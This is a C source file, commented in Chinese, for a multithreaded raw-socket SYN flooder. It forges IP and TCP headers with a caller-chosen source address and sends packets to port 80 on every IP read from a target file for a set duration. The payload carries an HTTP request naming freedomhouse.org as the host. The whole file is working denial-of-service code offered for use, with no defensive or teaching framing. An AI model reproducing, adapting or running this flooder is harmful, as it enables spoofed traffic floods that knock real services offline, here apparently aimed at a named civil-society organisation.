#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>

// 计算校验和
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }

    if (len == 1) {
        sum += *(unsigned char *)buf;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

// 伪头部结构
struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

// 线程数据结构
typedef struct {
    char target_ip[16];
    int source_port;
    char source_ip[16];
    int pps;
    int duration;
} thread_data_t;

// 线程函数
void *send_packets(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    char packet[4096];
    struct sockaddr_in dest;
    struct iphdr iph;
    struct tcphdr tcph;
    int sockfd;
    int packet_size = sizeof(iph) + sizeof(tcph) + strlen("GET / HTTP/1.1\r\nHost: freedomhouse.org\r\n\r\n");
    time_t start_time, current_time;

    // 创建原始套接字
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // 记录开始时间
    time(&start_time);

    // 目标地址设置
    dest.sin_family = AF_INET;
    dest.sin_port = htons(80);
    dest.sin_addr.s_addr = inet_addr(data->target_ip);

    while (1) {
        // 填充 IP 头部
        memset(&iph, 0, sizeof(iph));
        iph.ihl = 5;
        iph.version = 4;
        iph.tos = 0;
        iph.tot_len = htons(packet_size);
        iph.id = htons(54321);
        iph.frag_off = 0;
        iph.ttl = 255;
        iph.protocol = IPPROTO_TCP;
        iph.check = 0;
        iph.saddr = inet_addr(data->source_ip);
        iph.daddr = inet_addr(data->target_ip);

        // IP 头部校验和
        iph.check = checksum((unsigned short *)&iph, sizeof(iph));

        // 填充 TCP 头部
        memset(&tcph, 0, sizeof(tcph));
        tcph.source = htons(data->source_port);
        tcph.dest = htons(80);
        tcph.seq = htonl(rand() % (UINT32_MAX - 100000) + 100000);
        tcph.ack_seq = 0;
        tcph.doff = 5;
        tcph.syn = 1;
        tcph.window = htons(65535);
        tcph.check = 0;

        // 填充伪头部
        struct pseudo_header psh;
        memset(&psh, 0, sizeof(psh));
        psh.source_address = inet_addr(data->source_ip);
        psh.dest_address = inet_addr(data->target_ip);
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(tcph) + strlen("GET / HTTP/1.1\r\nHost: freedomhouse.org\r\n\r\n"));

        // 计算 TCP 校验和
        char *pseudogram = malloc(sizeof(psh) + sizeof(tcph) + strlen("GET / HTTP/1.1\r\nHost: freedomhouse.org\r\n\r\n"));
        memcpy(pseudogram, (char *)&psh, sizeof(psh));
        memcpy(pseudogram + sizeof(psh), &tcph, sizeof(tcph));
        memcpy(pseudogram + sizeof(psh) + sizeof(tcph), "GET / HTTP/1.1\r\nHost: freedomhouse.org\r\n\r\n", strlen("GET / HTTP/1.1\r\nHost: freedomhouse.org\r\n\r\n"));
        tcph.check = checksum((unsigned short *)pseudogram, sizeof(psh) + sizeof(tcph) + strlen("GET / HTTP/1.1\r\nHost: freedomhouse.org\r\n\r\n"));
        free(pseudogram);

        // 创建数据包
        memset(packet, 0, 4096);
        memcpy(packet, &iph, sizeof(iph));
        memcpy(packet + sizeof(iph), &tcph, sizeof(tcph));
        memcpy(packet + sizeof(iph) + sizeof(tcph), "GET / HTTP/1.1\r\nHost: freedomhouse.org\r\n\r\n", strlen("GET / HTTP/1.1\r\nHost: freedomhouse.org\r\n\r\n"));

        // 发送数据包
        if (sendto(sockfd, packet, packet_size, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            // 忽略发送失败错误
            // perror("Send failed");
        }

        // 检查运行时间
        time(&current_time);
        if (difftime(current_time, start_time) > data->duration) {
            break;
        }

        usleep(1000000 / data->pps); // PPS 控制
    }

    close(sockfd);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        fprintf(stderr, "Usage: %s <source_ip> <source_port> <target_file> <threads> <duration>\n", argv[0]);
        return 1;
    }

    char *source_ip = argv[1];
    int source_port = atoi(argv[2]);
    char *target_file = argv[3];
    int max_threads = atoi(argv[4]);
    int duration = atoi(argv[5]); // 运行时间

    FILE *file = fopen(target_file, "r");
    if (!file) {
        perror("File open failed");
        return 1;
    }

    char target_ip[16];
    pthread_t threads[max_threads];
    int thread_count = 0;
    int pps = 100; // 每秒包数（PPS）

    // 输出正在运行信息
    printf("正在运行...\n");

    // 记录开始时间
    time_t start_time, current_time;
    time(&start_time);

    while (1) {
        if (fgets(target_ip, sizeof(target_ip), file)) {
            // 去除 IP 地址末尾的换行符
            target_ip[strcspn(target_ip, "\r\n")] = 0;

            // 准备线程数据
            thread_data_t *data = malloc(sizeof(thread_data_t));
            strcpy(data->target_ip, target_ip);
            strcpy(data->source_ip, source_ip);
            data->source_port = source_port;
            data->pps = pps;
            data->duration = duration;

            // 创建线程
            if (pthread_create(&threads[thread_count], NULL, send_packets, (void *)data) != 0) {
                perror("Thread creation failed");
                free(data);
                continue;
            }
            thread_count++;

            // 限制线程数
            if (thread_count >= max_threads) {
                for (int i = 0; i < thread_count; i++) {
                    pthread_join(threads[i], NULL);
                }
                thread_count = 0;
            }
        } else {
            // 回到文件开头循环处理
            fseek(file, 0, SEEK_SET);

            // 检查运行时间
            time(&current_time);
            if (difftime(current_time, start_time) > duration) {
                break;
            }
        }
    }

    // 等待所有线程完成
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    fclose(file);
    return 0;
}
